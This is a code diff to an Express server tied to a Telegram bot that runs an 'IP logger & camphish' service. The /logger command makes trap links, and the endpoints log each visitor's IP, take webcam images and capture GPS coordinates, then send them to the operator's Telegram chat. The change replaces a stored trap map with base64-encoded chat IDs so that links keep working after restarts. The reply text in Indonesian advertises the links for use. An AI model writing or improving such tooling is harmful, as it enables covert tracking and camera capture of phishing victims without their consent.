@@ -29,28 +29,21 @@ async function startServer() {
   const app = express();
   const PORT = 3000;
 
-  const TRAP_FILE = path.join(process.cwd(), 'trap_map.json');
-  let trapMap = new Map<string, number>();
-  
-  // Load trapMap from file on startup
-  try {
-    if (fs.existsSync(TRAP_FILE)) {
-      const data = fs.readFileSync(TRAP_FILE, 'utf-8');
-      const parsed = JSON.parse(data);
-      trapMap = new Map<string, number>(Object.entries(parsed));
-      console.log(`Loaded ${trapMap.size} traps from disk.`);
-    }
-  } catch (e) {
-    console.error("Error loading trapMap:", e);
-  }
+  // Stateless Trap ID Generation & Validation
+  const generateTrapId = (chatId: number) => {
+    return Buffer.from(`${chatId}-OSINT-${crypto.randomUUID().slice(0,4)}`).toString('base64url');
+  };
 
-  // Helper to save trapMap
-  const saveTrapMap = () => {
+  const getChatIdFromTrapId = (trapId: string): number | null => {
     try {
-      const obj = Object.fromEntries(trapMap);
-      fs.writeFileSync(TRAP_FILE, JSON.stringify(obj, null, 2), 'utf-8');
-    } catch (e) {
-      console.error("Error saving trapMap:", e);
+      const decoded = Buffer.from(trapId, 'base64url').toString('utf-8');
+      if (decoded.includes('-OSINT-')) {
+        const idStr = decoded.split('-OSINT-')[0];
+        return parseInt(idStr, 10);
+      }
+      return null;
+    } catch {
+      return null;
     }
   };
 
@@ -167,7 +160,7 @@ async function startServer() {
   // ========== IP LOGGER & CAMPHISH TRAP ENDPOINTS ==========
   app.get('/t/:tmplId/:id', (req, res) => {
     const { id, tmplId } = req.params;
-    const chatId = trapMap.get(id);
+    const chatId = getChatIdFromTrapId(id);
     if (!chatId) return res.status(404).send('<h2>Error 404: Link Invalid or Expired.</h2><p>This logger link has expired or the bot system was restarted. Please generate a new link using /logger.</p>');
 
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
@@ -195,7 +188,7 @@ async function startServer() {
   // Handle Camphish Image Upload
   app.post('/api/log/:id/cam', express.json({limit: '10mb'}), (req, res) => {
     const id = req.params.id;
-    const chatId = trapMap.get(id);
+    const chatId = getChatIdFromTrapId(id);
     if (chatId && process.env.TELEGRAM_BOT_TOKEN) {
       const { image } = req.body;
       if (image && typeof image === 'string') {
@@ -210,7 +203,7 @@ async function startServer() {
 
   app.post('/api/log/:id/gps', express.json(), (req, res) => {
     const id = req.params.id;
-    const chatId = trapMap.get(id);
+    const chatId = getChatIdFromTrapId(id);
     if (chatId && process.env.TELEGRAM_BOT_TOKEN) {
       const { lat, lon, acc } = req.body;
       const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
@@ -401,9 +394,7 @@ async function startServer() {
     });
 
     bot.command('logger', (ctx) => {
-      const id = crypto.randomUUID().slice(0, 8);
-      trapMap.set(id, ctx.chat.id);
-      saveTrapMap();
+      const id = generateTrapId(ctx.chat.id);
       
       let replyMessage = `🎣 <b>LINK LOGGER BERHASIL DIBUAT!</b>\n\n<b>Silakan copy link dengan template yang Anda inginkan:</b>\n\n`;
       
